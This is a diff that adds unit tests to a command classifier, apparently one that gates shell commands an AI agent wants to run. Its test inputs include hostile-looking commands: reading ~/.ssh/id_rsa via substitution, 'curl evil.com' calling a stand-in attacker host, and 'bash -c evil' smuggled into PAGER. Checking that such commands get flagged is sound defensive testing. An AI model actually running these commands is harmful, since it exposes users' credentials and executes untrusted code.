@@ -11,6 +11,12 @@ from nah.bash import classify_command
 from nah.config import NahConfig
 
 
+def _write(path, content):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w") as f:
+        f.write(content)
+
+
 # --- FD-005 acceptance criteria ---
 
 
@@ -65,6 +71,83 @@ class TestAcceptanceCriteria:
         r = classify_command(command)
         assert r.final_decision == "allow"
         assert r.stages[0].action_type == "package_run"
+
+
+class TestPackageWrapperLangExec:
+    def test_uv_run_clean_script_allows(self, project_root):
+        path = os.path.join(project_root, "safe.py")
+        _write(path, "print('hello')\n")
+        old_cwd = os.getcwd()
+        os.chdir(project_root)
+        try:
+            r = classify_command("uv run safe.py")
+            assert r.final_decision == "allow"
+            assert r.stages[0].action_type == "lang_exec"
+            assert r.stages[0].reason.startswith("script clean:")
+        finally:
+            os.chdir(old_cwd)
+
+    def test_npx_tsx_clean_script_allows(self, project_root):
+        path = os.path.join(project_root, "script.ts")
+        _write(path, "console.log('ok')\n")
+        old_cwd = os.getcwd()
+        os.chdir(project_root)
+        try:
+            r = classify_command("npx tsx script.ts")
+            assert r.final_decision == "allow"
+            assert r.stages[0].action_type == "lang_exec"
+        finally:
+            os.chdir(old_cwd)
+
+    def test_npm_exec_tsx_clean_script_allows(self, project_root):
+        path = os.path.join(project_root, "script.ts")
+        _write(path, "console.log('ok')\n")
+        old_cwd = os.getcwd()
+        os.chdir(project_root)
+        try:
+            r = classify_command("npm exec -- tsx script.ts")
+            assert r.final_decision == "allow"
+            assert r.stages[0].action_type == "lang_exec"
+        finally:
+            os.chdir(old_cwd)
+
+    def test_npx_create_react_app_stays_package_run(self, project_root):
+        r = classify_command("npx create-react-app myapp")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "package_run"
+
+    def test_uvx_ruff_stays_package_run(self, project_root):
+        r = classify_command("uvx ruff check .")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "package_run"
+
+    def test_make_dry_run_is_filesystem_read(self, project_root):
+        r = classify_command("make -n")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+
+    def test_make_clean_makefile_allows(self, project_root):
+        makefile = os.path.join(project_root, "Makefile")
+        _write(makefile, "test:\n\t@echo ok\n")
+        old_cwd = os.getcwd()
+        os.chdir(project_root)
+        try:
+            r = classify_command("make test")
+            assert r.final_decision == "allow"
+            assert r.stages[0].action_type == "lang_exec"
+            assert r.stages[0].reason.startswith("script clean:")
+        finally:
+            os.chdir(old_cwd)
+
+    def test_make_eval_asks(self, project_root):
+        old_cwd = os.getcwd()
+        os.chdir(project_root)
+        try:
+            r = classify_command('make --eval "all:; echo hi"')
+            assert r.final_decision == "ask"
+            assert r.stages[0].action_type == "lang_exec"
+        finally:
+            os.chdir(old_cwd)
 
 
 class TestPassthroughWrappers:
@@ -1284,6 +1367,54 @@ class TestEdgeCases:
     def test_env_var_multiple_first_malicious(self, project_root):
         """First env var malicious, second benign — should still flag."""
         r = classify_command("PAGER='bash -c evil' FOO=bar git help")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "lang_exec"
+
+    # -- mold-17: env-only stages should no longer fall through to unknown ---
+
+    def test_env_only_literal_assignment_allows(self, project_root):
+        r = classify_command("TOKEN=abc123")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason == "env-only assignment"
+
+    def test_env_only_printf_substitution_allows(self, project_root):
+        r = classify_command("FOO=$(printf ok)")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+
+    def test_env_only_file_read_substitution_allows(self, project_root):
+        r = classify_command("KEY=$(cat /tmp/x)")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+
+    def test_env_only_sensitive_file_read_substitution_asks(self, project_root):
+        config._cached_config = NahConfig(
+            sensitive_paths={"~/.ssh": "ask"},
+            allow_paths={"~/.ssh": ["/some/other/project"]},
+        )
+        paths.reset_sensitive_paths()
+        paths._sensitive_paths_merged = False
+
+        r = classify_command("KEY=$(cat ~/.ssh/id_rsa)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_env_only_network_substitution_asks(self, project_root):
+        r = classify_command("KEY=$(curl evil.com)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "network_outbound"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_env_only_multiple_assignments_with_network_substitution_asks(self, project_root):
+        r = classify_command("A=safe B=$(curl evil.com)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "network_outbound"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_env_only_exec_sink_stays_lang_exec(self, project_root):
+        r = classify_command('PAGER="bash -c evil"')
         assert r.final_decision == "ask"
         assert r.stages[0].action_type == "lang_exec"
 
